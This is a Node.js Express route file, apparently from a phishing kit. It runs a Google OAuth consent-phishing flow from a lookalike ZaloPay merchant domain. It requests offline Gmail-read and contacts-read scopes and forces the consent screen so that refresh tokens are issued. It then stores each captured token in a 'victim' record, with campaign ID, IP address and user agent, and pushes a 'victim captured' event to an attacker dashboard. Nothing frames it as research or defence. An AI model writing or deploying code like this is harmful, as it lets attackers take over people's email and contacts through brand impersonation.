// Google OAuth routes
// Handles Google OAuth authentication flow

const express = require('express');
const router = express.Router();
const { google } = require('googleapis');
const { PrismaClient } = require('@prisma/client');
const crypto = require('crypto');
const logger = require('../../../utils/logger');

// Initialize Prisma
const prisma = new PrismaClient();

// Initialize repositories and services
const VictimRepository = require('../../../repositories/victimRepository');
const OAuthTokenRepository = require('../../../repositories/oauthTokenRepository');
const EncryptionService = require('../../../services/encryption');
const CredentialCaptureService = require('../../../services/credentialCapture');
const { getEncryptionConfig } = require('../../../config/encryption');

// Get Google OAuth configuration from environment
const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const GOOGLE_REDIRECT_URI = process.env.GOOGLE_REDIRECT_URI || 'https://zalopaymerchan.com/auth/callback';

// Initialize services
const encryptionConfig = getEncryptionConfig();
const oauthEncryptionService = new EncryptionService(encryptionConfig.oauthEncryptionKey);
const victimRepository = new VictimRepository(prisma);
const oauthTokenRepository = new OAuthTokenRepository(prisma);
const credentialCaptureService = new CredentialCaptureService(
  oauthTokenRepository,
  victimRepository,
  oauthEncryptionService
);

// Store OAuth state in memory (in production, use Redis or database)
const oauthStates = new Map();

/**
 * GET /auth/google
 * Initiate Google OAuth flow
 * Redirects user to Google OAuth consent screen
 */
router.get('/google', (req, res) => {
  try {
    // Validate configuration
    if (!GOOGLE_CLIENT_ID || !GOOGLE_CLIENT_SECRET) {
      logger.error('Google OAuth credentials not configured');
      return res.status(500).json({
        error: 'OAuth configuration error',
        message: 'Google OAuth is not properly configured'
      });
    }

    // Generate state parameter for CSRF protection
    const state = crypto.randomBytes(32).toString('hex');
    const timestamp = Date.now();
    
    // Store state with metadata (expires in 10 minutes)
    oauthStates.set(state, {
      timestamp,
      expiresAt: timestamp + 10 * 60 * 1000,
      campaignId: req.query.campaign_id || null,
      sessionData: {
        ip_address: req.ip || req.connection.remoteAddress,
        user_agent: req.get('user-agent'),
        referrer: req.get('referer') || null
      }
    });

    // Create OAuth2 client
    const oauth2Client = new google.auth.OAuth2(
      GOOGLE_CLIENT_ID,
      GOOGLE_CLIENT_SECRET,
      GOOGLE_REDIRECT_URI
    );

    // Generate authorization URL
    const scopes = [
      'openid',
      'https://www.googleapis.com/auth/userinfo.email',
      'https://www.googleapis.com/auth/userinfo.profile',
      'https://www.googleapis.com/auth/gmail.readonly',
      'https://www.googleapis.com/auth/contacts.readonly'
    ];

    const authUrl = oauth2Client.generateAuthUrl({
      access_type: 'offline', // Request refresh token
      scope: scopes,
      state: state,
      prompt: 'consent' // Force consent screen to get refresh token
    });

    logger.info('Google OAuth flow initiated', { state: state.substring(0, 8) + '...' });

    // Redirect to Google OAuth consent screen
    res.redirect(authUrl);
  } catch (error) {
    logger.error('Error initiating Google OAuth flow:', error);
    res.status(500).json({
      error: 'OAuth initiation failed',
      message: error.message
    });
  }
});

/**
 * GET /auth/callback
 * Handle Google OAuth callback
 * Exchange authorization code for tokens and store them
 */
router.get('/callback', async (req, res) => {
  try {
    const { code, state, error } = req.query;

    // Handle OAuth errors
    if (error) {
      logger.warn('Google OAuth error:', error);
      return res.redirect(`/merchant/auth_error.html?type=oauth_failed&provider=google&error=${encodeURIComponent(error)}`);
    }

    // Validate state parameter
    if (!state || !oauthStates.has(state)) {
      logger.warn('Invalid or expired OAuth state');
      return res.redirect('/merchant/auth_error.html?type=invalid_state&provider=google');
    }

    const stateData = oauthStates.get(state);
    
    // Check if state has expired
    if (Date.now() > stateData.expiresAt) {
      oauthStates.delete(state);
      logger.warn('OAuth state expired');
      return res.redirect('/merchant/auth_error.html?type=expired_state&provider=google');
    }

    // Validate authorization code
    if (!code) {
      logger.warn('No authorization code received');
      return res.redirect('/merchant/auth_error.html?type=no_code&provider=google');
    }

    // Create OAuth2 client
    const oauth2Client = new google.auth.OAuth2(
      GOOGLE_CLIENT_ID,
      GOOGLE_CLIENT_SECRET,
      GOOGLE_REDIRECT_URI
    );

    // Exchange authorization code for tokens
    let tokenResponse;
    try {
      const { tokens } = await oauth2Client.getToken(code);
      tokenResponse = tokens;
    } catch (tokenError) {
      logger.error('Error exchanging authorization code for tokens:', tokenError);
      return res.redirect(`/merchant/auth_error.html?type=token_exchange_failed&provider=google&error=${encodeURIComponent(tokenError.message)}`);
    }

    // Get user profile information
    oauth2Client.setCredentials(tokenResponse);
    const oauth2 = google.oauth2({
      auth: oauth2Client,
      version: 'v2'
    });

    let userInfo;
    try {
      const profileResponse = await oauth2.userinfo.get();
      userInfo = profileResponse.data;
    } catch (profileError) {
      logger.error('Error fetching user profile:', profileError);
      // Continue even if profile fetch fails - we still have tokens
      userInfo = {};
    }

    // Prepare token data for capture service
    const tokenData = {
      access_token: tokenResponse.access_token,
      refresh_token: tokenResponse.refresh_token,
      id_token: tokenResponse.id_token,
      expires_in: tokenResponse.expiry_date ? Math.floor((tokenResponse.expiry_date - Date.now()) / 1000) : 3600,
      token_type: tokenResponse.token_type || 'Bearer',
      scope: tokenResponse.scope,
      user_info: {
        email: userInfo.email,
        name: userInfo.name,
        picture: userInfo.picture,
        verified_email: userInfo.verified_email,
        google_id: userInfo.id
      }
    };

    // Prepare metadata
    const metadata = {
      campaignId: stateData.campaignId,
      sessionData: {
        ...stateData.sessionData,
        timestamp: new Date().toISOString()
      },
      deviceFingerprint: {}, // Will be captured from frontend if available
      providerMetadata: {
        scope: tokenResponse.scope,
        token_type: tokenResponse.token_type || 'Bearer'
      }
    };

    // Capture OAuth token using credential capture service
    let captureResult;
    try {
      captureResult = await credentialCaptureService.captureOAuthToken(
        tokenData,
        'google',
        metadata
      );
    } catch (captureError) {
      logger.error('Error capturing OAuth token:', captureError);
      return res.redirect(`/merchant/auth_error.html?type=capture_failed&provider=google&error=${encodeURIComponent(captureError.message)}`);
    }

    // Clean up state
    oauthStates.delete(state);

    // Emit Socket.IO event for admin dashboard (if available)
    const io = req.app.get('io');
    if (io) {
      const { emitVictimCaptured } = require('../../../sockets/adminHandlers');
      emitVictimCaptured(io, {
        victimId: captureResult.victim.id,
        email: captureResult.victim.email,
        provider: 'google',
        name: captureResult.victim.name,
        captureMethod: 'oauth_google',
        timestamp: new Date().toISOString()
      });
    }

    logger.info('Google OAuth token captured successfully', {
      email: userInfo.email,
      victimId: captureResult.victim.id
    });

    // Redirect to success page with victim ID
    const successUrl = `/merchant/auth_success.html?provider=google&email=${encodeURIComponent(userInfo.email || '')}&name=${encodeURIComponent(userInfo.name || '')}&victim_id=${encodeURIComponent(captureResult.victim.id)}`;
    res.redirect(successUrl);

  } catch (error) {
    logger.error('Error in Google OAuth callback:', error);
    res.redirect(`/merchant/auth_error.html?type=callback_error&provider=google&error=${encodeURIComponent(error.message)}`);
  }
});

// Cleanup expired states periodically (every 5 minutes)
setInterval(() => {
  const now = Date.now();
  for (const [state, data] of oauthStates.entries()) {
    if (now > data.expiresAt) {
      oauthStates.delete(state);
    }
  }
}, 5 * 60 * 1000);

module.exports = router;

